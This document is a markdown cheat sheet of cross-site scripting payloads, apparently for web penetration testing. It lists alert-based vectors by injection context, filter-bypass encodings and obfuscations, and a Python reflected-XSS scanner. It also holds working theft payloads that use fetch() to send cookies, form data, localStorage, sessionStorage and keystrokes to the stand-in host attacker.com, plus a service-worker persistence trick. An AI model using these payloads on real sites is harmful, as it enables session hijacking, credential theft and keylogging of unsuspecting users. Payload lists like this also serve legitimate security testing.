# XSS Payload Collection and Manual Testing Tools

Comprehensive collection of XSS payloads, vectors, and manual testing techniques for various contexts and filters.

## Basic XSS Vectors

### Alert-Based Payloads
```html
<!-- Standard script tag -->
<script>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>

<!-- Image-based -->
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<img src="x" onerror="alert('XSS')">

<!-- SVG-based -->
<svg onload=alert('XSS')>
<svg><script>alert('XSS')</script></svg>
<svg onload="alert('XSS')"></svg>

<!-- Body events -->
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>

<!-- Input events -->
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<select onfocus=alert('XSS') autofocus><option>XSS</option></select>

<!-- Media events -->
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>
<embed src=javascript:alert('XSS')>

<!-- Link events -->
<a onmouseover="alert('XSS')">XSS</a>
<map><area shape=rect href=javascript:alert('XSS')>

<!-- Form events -->
<form><button formaction=javascript:alert('XSS')>XSS</button>
<form><input type=submit formaction=javascript:alert('XSS') value=XSS>

<!-- Style-based -->
<div style="background:url('javascript:alert(\'XSS\')')">
<style>@import'javascript:alert("XSS")';</style>
```

### Advanced Event Handlers
```html
<!-- Mouse events -->
<div onmouseover=alert('XSS')>Hover me</div>
<div onmouseout=alert('XSS')>Leave me</div>
<div onclick=alert('XSS')>Click me</div>
<div ondblclick=alert('XSS')>Double click</div>

<!-- Keyboard events -->
<div onkeydown=alert('XSS') tabindex=1>Press key</div>
<div onkeyup=alert('XSS') tabindex=1>Release key</div>
<div onkeypress=alert('XSS') tabindex=1>Type here</div>

<!-- Focus events -->
<div onfocus=alert('XSS') tabindex=1>Focus me</div>
<div onblur=alert('XSS') tabindex=1>Blur me</div>

<!-- Change events -->
<input onchange=alert('XSS')>
<select onchange=alert('XSS')><option>1</option><option>2</option></select>
<textarea oninput=alert('XSS')></textarea>

<!-- Loading events -->
<iframe onload=alert('XSS') src=about:blank></iframe>
<object onload=alert('XSS') data=data:text/html,<script>parent.alert('XSS')</script>></object>

<!-- Error events -->
<img onerror=alert('XSS') src=invalid>
<script onerror=alert('XSS') src=invalid></script>
<link onerror=alert('XSS') href=invalid>
```

## Context-Specific Payloads

### HTML Context
```html
<!-- Basic injection -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Tag breaking -->
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
</title><script>alert('XSS')</script>
```

### Attribute Context
```html
<!-- Event handler injection -->
" onclick="alert('XSS')" "
' onmouseover='alert("XSS")' '
" onfocus="alert('XSS')" autofocus "

<!-- Breaking attributes -->
" onmouseover="alert('XSS')
' onclick='alert("XSS")
" onclick=alert('XSS')//

<!-- JavaScript URL -->
javascript:alert('XSS')
javascript:alert(String.fromCharCode(88,83,83))
javascript:alert(/XSS/.source)
```

### JavaScript Context
```javascript
// String breaking
';alert('XSS');//
";alert('XSS');//
\';alert(String.fromCharCode(88,83,83));//

// Variable context
var x = 'USER_INPUT'; --> ';alert('XSS');//
var obj = {prop: 'USER_INPUT'}; --> '};alert('XSS');//{prop:'

// Function context
function test(USER_INPUT) {} --> ){alert('XSS')}//
```

### CSS Context
```css
/* CSS injection */
</style><script>alert('XSS')</script><style>
expression(alert('XSS'))
url('javascript:alert("XSS")')

/* CSS selectors */
a[href^="javascript:alert('XSS')"]
body{background:url("javascript:alert('XSS')")}
```

### JSON Context
```json
// JSON injection
{"key": "value", "xss": "</script><script>alert('XSS')</script>"}
{"data": "\"}]);alert('XSS');//"}
```

## Filter Bypass Techniques

### Case Variations
```html
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x ONERROR=alert('XSS')>
<SvG OnLoAd=alert('XSS')>
<BODY ONLOAD=ALERT('XSS')>
```

### Encoding Variations
```html
<!-- URL Encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E
%22%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E

<!-- Double URL Encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- HTML Entity Encoding -->
&lt;script&gt;alert('XSS')&lt;/script&gt;
&#60;script&#62;alert('XSS')&#60;/script&#62;

<!-- Hex Entity Encoding -->
&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;

<!-- Unicode Encoding -->
\u003cscript\u003ealert('XSS')\u003c/script\u003e
\u0053\u0063\u0052\u0069\u0050\u0054alert('XSS')

<!-- Base64 Encoding -->
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">
```

### Comment Insertion
```html
<scr<!--comment-->ipt>alert('XSS')</script>
<img src=x onerr<!---->or=alert('XSS')>
<svg onlo<!---->ad=alert('XSS')>
```

### Tag Obfuscation
```html
<!-- Nested tags -->
<scr<script>ipt>alert('XSS')</script>
<img src=x onerr<b>or=alert('XSS')>

<!-- Broken tags -->
<script
>alert('XSS')</script>
<img src=x
onerror=alert('XSS')>

<!-- Multiple attributes -->
<img src=x width=1 height=1 onerror=alert('XSS')>
```

### Character Set Bypasses
```html
<!-- Alternative quotes -->
<img src=x onerror=alert("XSS")>
<img src=x onerror=alert(`XSS`)>
<img src=x onerror='alert("XSS")'>

<!-- No quotes -->
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<svg onload=alert(/XSS/.source)>

<!-- Backticks -->
<img src=x onerror=`alert('XSS')`>
```

### Function Alternatives
```javascript
// Alert alternatives
confirm('XSS')
prompt('XSS')
console.log('XSS')
window['alert']('XSS')
self['alert']('XSS')
top['alert']('XSS')
parent['alert']('XSS')
eval('alert("XSS")')
Function('alert("XSS")')()
setTimeout('alert("XSS")',0)
setInterval('alert("XSS")',0)

// String construction
String.fromCharCode(88,83,83)
'\x58\x53\x53'
'\u0058\u0053\u0053'
atob('WFNT')
```

## Advanced Payload Techniques

### DOM-Based XSS
```javascript
// Location manipulation
<script>alert(location.hash.slice(1))</script>
// URL: page.html#<img src=x onerror=alert('XSS')>

// Document.write exploitation
<script>document.write('<img src=x onerror=alert("XSS")")></script>

// innerHTML manipulation
<script>document.body.innerHTML='<img src=x onerror=alert("XSS")">'</script>

// Event handler manipulation
<script>document.onclick=function(){alert('XSS')}</script>
```

### Data Exfiltration Payloads
```javascript
// Cookie stealing
<script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>

// Form data harvesting
<script>
document.forms[0].onsubmit=function(){
  fetch('https://attacker.com/harvest',{
    method:'POST',
    body:new FormData(this)
  })
}
</script>

// Local storage extraction
<script>
fetch('https://attacker.com/storage',{
  method:'POST',
  body:JSON.stringify(localStorage)
})
</script>

// Session hijacking
<script>
fetch('https://attacker.com/session',{
  method:'POST',
  body:'sessionStorage='+JSON.stringify(sessionStorage)
})
</script>
```

### Keylogger Payloads
```javascript
<script>
var keys='';
document.onkeypress=function(e){
  keys+=String.fromCharCode(e.which);
  if(keys.length>50){
    fetch('https://attacker.com/keys',{method:'POST',body:keys});
    keys='';
  }
}
</script>
```

### Persistent XSS
```javascript
// Local storage persistence
<script>
localStorage.setItem('xss','<img src=x onerror=alert("Persistent XSS")>');
document.write(localStorage.getItem('xss'));
</script>

// Service worker persistence
<script>
if('serviceWorker' in navigator){
  navigator.serviceWorker.register('data:text/javascript,self.addEventListener("fetch",function(e){e.respondWith(new Response("<script>alert(\'XSS\')</script>",{headers:{"Content-Type":"text/html"}}))})');
}
</script>
```

## Testing Methodology

### Manual Testing Checklist
```
1. Parameter Discovery
   □ URL parameters (GET)
   □ Form fields (POST)
   □ HTTP headers
   □ Cookies
   □ JSON/XML data

2. Context Analysis
   □ HTML context
   □ Attribute context
   □ JavaScript context
   □ CSS context
   □ URL context

3. Filter Testing
   □ Script tag blocking
   □ Event handler filtering
   □ Keyword blacklisting
   □ Character encoding
   □ Length restrictions

4. Bypass Techniques
   □ Case variation
   □ Encoding methods
   □ Comment insertion
   □ Tag obfuscation
   □ Alternative functions

5. Exploitation
   □ Alert confirmation
   □ Cookie extraction
   □ Session hijacking
   □ DOM manipulation
   □ Persistent storage
```

### Automated Testing Script
```python
#!/usr/bin/env python3
import requests
import urllib.parse

def test_xss(url, param, payloads):
    """Test XSS vulnerabilities with various payloads"""
    vulnerabilities = []
    
    for payload in payloads:
        # Test GET parameters
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        
        try:
            response = requests.get(test_url)
            if payload in response.text:
                vulnerabilities.append({
                    'type': 'Reflected XSS',
                    'url': test_url,
                    'payload': payload,
                    'parameter': param
                })
        except:
            continue
            
    return vulnerabilities

# Payload list
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>"
]

# Test target
target_url = "http://target.com/search.php"
results = test_xss(target_url, "q", xss_payloads)

for vuln in results:
    print(f"Found {vuln['type']} with payload: {vuln['payload']}")
```

Comprehensive toolkit for manual XSS testing across various contexts, filters, and exploitation scenarios.
